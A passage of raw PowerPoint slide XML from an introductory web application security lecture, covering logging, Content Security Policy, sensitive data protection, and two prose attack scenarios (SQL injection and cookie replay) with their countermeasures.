            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Log events: failed logins, privilege changes, access violations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Protect log files (access control, encryption).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Avoid logging sensitive data (passwords, credit card numbers).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39556607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5A6A3-0286-7744-BB35-74043E7E9797}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Content Security Policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFC792E7-F3FD-6325-35FB-B651A8DBBB3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>A Content Security Policy (CSP) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is a security standard that allows web developers to control which resources (like JavaScript, CSS, and images) their web pages can load, preventing various injection-based attacks such as Cross-Site Scripting (XSS), clickjacking, and malicious content injection by whitelisting allowed content sources. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Purpose</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: Restrict what resources (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>scripts, styles, images, etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.) a web page can load and execute.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>: Configured using an HTTP response header (e.g., Content-Security-Policy).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30028643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BE375-17C5-4CBC-B2DB-C61F14B4F74E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Why CSP is Needed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{49AEBF26-DC36-48ED-CCCF-27E72429B981}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>Web applications are vulnerable to XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> (injecting malicious scripts).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Without CSP, attackers can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Steal session cookies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Perform unauthorized actions (session hijacking, phishing).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Load malicious scripts from third-party servers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>CSP acts as a whitelist</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> of trusted content sources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30320316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18735-1C71-F949-D94E-3B8126C399B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example of CSP in Action</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7E54A9E-45C6-7D5A-FADE-A811C5B5140E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>CSP Header Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Content-Security-Policy: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t> 'self'; script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t> 'self' https://apis.google.com; style-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t> 'self' 'unsafe-inline';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Meaning:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t> 'self': </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Load resources only from the same domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>script-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Allow scripts only from same domain and Google APIs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>style-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Allow styles only from same domain (with inline styles permitted).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14036897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FAC66-3FC0-7948-8D8A-C41E1A00E43F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sensitive data</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14D46AA7-B0F8-FEAE-C33D-480730B57133}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sensitive data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> refers to information that is confidential and requires protection due to its nature or potential impact if exposed. This type of data can include a wide range of information, such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Personally Identifiable Information (PII): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Names, Social Security numbers, addresses, phone numbers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Financial Information: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Credit card numbers, bank account details, tax records</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Health Information: Medical records, health insurance details</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Intellectual Property (IP): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Trade secrets, patents, copyrights, and proprietary business information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Credentials: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Passwords, security questions, and other authentication-related data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sensitive Business Information: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Contracts, strategic plans, employee records, and other internal documents.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8589905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C2FD6-FB8B-67AE-2927-172CA35DBDB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Secure Storage of Sensitive Data</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{363CA0A0-F2AD-8D6A-EACF-6F4195732C67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Encryption:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    At Rest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    In Transit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Access Control:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Principle of Least Privilege</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Authentication and Authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Audit Trails</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regular Audits and Monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data Backup and Recovery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Secure Disposal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Compliance with Regulations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Employee Training</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20279149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9C1DB-38E5-DA4C-C035-67337CDA4ED5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Sensitive Data Protection,</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83B8CBEE-3E09-282B-B17E-3820B06A72EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Data Minimization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>: Collect/store only what is necessary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Encryption</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>: Protect data in transit (TLS/SSL) and at rest (AES, RSA).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Hashing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>: Use strong hashing (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>bcrypt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>, Argon2) for passwords.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Access Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>: Principle of least privilege; Role-Based Access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Masking &amp; Tokenization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>: Replace sensitive values with masked or tokenized forms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Monitoring &amp; Logging</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>: Detect unauthorized access attempts.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="353498867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Example-1 - attack scenarios</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A web application uses automatic database encryption algorithm to encrypt sensitive data, the credit card numbers of customers, and stores it on the database. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The same web application also allows automatic decryption and retrieval of data from the database, thereby permitting an attacker to use SQL injection attack to disclose in clear text the sensitive information, which needs to be protected. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The method to countermeasure this attack is to use public key to encrypt the sensitive data through front-end application automatically, and private key to decrypt the same data, which is only permitted through the back-end application by an authorized personnel.</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03993682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Example-2 - attack scenarios</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>A web application is not using secure socket layer to authenticate its web pages. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This application security vulnerability can be exploited by an attacker who monitors the network traffic and can thieve user’s session cookies. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The cookie can then be misused to hijack the user’s session using the cookie replay attack, thereby allowing the sensitive data of the user to get compromised. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The countermeasure for this attack is to make your web application secured by using SSL technology.</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17586568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5062A-E82A-18E5-0FDC-518A8A6F61D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{19298FE1-B9E1-FBEE-99EE-9F643EA479B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
